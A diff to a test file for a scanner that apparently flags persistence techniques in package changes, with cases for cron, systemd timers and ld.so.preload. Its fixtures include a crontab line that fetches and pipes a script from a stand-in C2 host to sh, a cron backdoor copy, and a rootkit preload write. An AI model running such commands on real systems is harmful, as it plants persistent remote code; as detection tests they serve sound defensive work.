@@ -60,12 +60,50 @@ describe('persistence rules', () => {
 
   it.each([
     ['PERSIST-001', 'systemctl --user enable foo.service'],
-    ['PERSIST-002', 'OnCalendar=*-*-* 04:00:00'],
+    ['CAUR-CRON-MODIFY', '(crontab -l; echo "* * * * * curl http://c2.example/x.sh | sh") | crontab -'],
+    ['CAUR-CRON-MODIFY', 'crontab -r'],
+    ['CAUR-CRON-FILE', 'echo "0 4 * * * x" > /etc/cron.d/persist'],
+    ['CAUR-CRON-FILE', 'cp backdoor /var/spool/cron/root'],
+    ['CAUR-LDSO-PRELOAD', 'echo "/tmp/rootkit.so" > /etc/ld.so.preload'],
     ['PERSIST-004', 'echo x > /etc/rc.local'],
     ['PERSIST-006', 'ExecStart=/usr/bin/systemd-cacheupd'],
     ['PERSIST-006', 'systemctl start systemd-updated'],
   ])('flags %s for %j', (id, line) => {
     expect(ruleById(PERSISTENCE_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
+  });
+
+  it('flags timer scheduling only inside install scriptlets, reporting shipped units as info instead', () => {
+    const scriptlet = makeChange(addedOnlyDiff(['OnCalendar=*-*-* 04:00:00']), { new_path: 'foo/foo.install' });
+    expect(ruleById(PERSISTENCE_RULES, 'PERSIST-002').check(scriptlet)).not.toBeNull();
+
+    const pkgbuild = makeChange(addedOnlyDiff(['OnCalendar=weekly']), { new_path: 'foo/PKGBUILD' });
+    expect(ruleById(PERSISTENCE_RULES, 'PERSIST-002').check(pkgbuild)).toBeNull();
+
+    const unit = makeChange(addedOnlyDiff(['[Timer]', 'OnUnitActiveSec=1h']), {
+      new_path: 'foo/foo.timer',
+      new_file: true,
+    });
+    expect(ruleById(PERSISTENCE_RULES, 'PERSIST-002').check(unit)).toBeNull();
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-TIMER-UNIT').check(unit)).not.toBeNull();
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-TIMER-UNIT').severity).toBe('info');
+
+    const service = makeChange(addedOnlyDiff(['ExecStart=/usr/bin/foo']), { new_path: 'foo/foo.service' });
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-TIMER-UNIT').check(service)).toBeNull();
+  });
+
+  it('reports daemon-reload as info without flagging PERSIST-001', () => {
+    const scriptlet = makeChange(addedOnlyDiff(['systemctl daemon-reload']), { new_path: 'foo/foo.install' });
+    expect(ruleById(PERSISTENCE_RULES, 'PERSIST-001').check(scriptlet)).toBeNull();
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-DAEMON-RELOAD').check(scriptlet)).not.toBeNull();
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-DAEMON-RELOAD').severity).toBe('info');
+  });
+
+  it('does not flag crontab listing or package-scoped cron paths', () => {
+    const listing = makeChange(addedOnlyDiff(['crontab -l']));
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-CRON-MODIFY').check(listing)).toBeNull();
+
+    const packaged = makeChange(addedOnlyDiff(['install -Dm0644 foo.cron "$pkgdir"/etc/cron.d/foo']));
+    expect(ruleById(PERSISTENCE_RULES, 'CAUR-CRON-FILE').check(packaged)).toBeNull();
   });
 
   it('flags the restart-persistence signature only when always-restart and a long delay combine', () => {
